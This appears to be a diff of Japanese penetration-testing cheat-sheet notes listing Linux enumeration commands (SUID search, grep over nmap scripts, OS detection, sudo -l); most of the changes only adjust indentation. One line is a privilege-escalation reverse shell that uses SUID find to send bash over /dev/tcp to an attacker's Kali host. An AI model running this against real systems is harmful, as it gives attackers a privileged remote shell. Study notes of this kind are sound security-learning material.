@@ -38,13 +38,14 @@
       find / -perm -4000
       #または
       find / -type f -perm -4000 -ls 2>/dev/null
+
       #コマンド実行
       find ~/.profile -exec /bin/bash -p -i >& /dev/tcp/<kali ip address>/4444 0>&1 \; -quit
   ```
 
 * grep
   
-    ```shell
+  ```shell
       #階層検索
       grep -r
       #よく使う
@@ -53,14 +54,14 @@
       grep -l
       # nseスクリプトで脆弱性検索
       grep <app_name> -rl /usr/share/nmap/scripts/ 
-    ```
+  ```
 
 * egrep
 
-    ``` shell
+  ``` shell
       # 実行されているOSバージョンを表示
       ls /etc | egrep -e "fedore*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release"
-    ```
+  ```
 
 * ユーザ情報
 
@@ -71,7 +72,7 @@
 * マウントされているボリュームの取得
   
   ``` shell
-      mount
+     mount
   ```
 
 * netstat
@@ -132,10 +133,10 @@
 
 * sudo
   
-    ``` shell
-        #sudoの情報表示
-        sudo -l
-    ```
+  ``` shell
+      #sudoの情報表示
+      sudo -l
+  ```
 
 * wget
   * ダウンロード
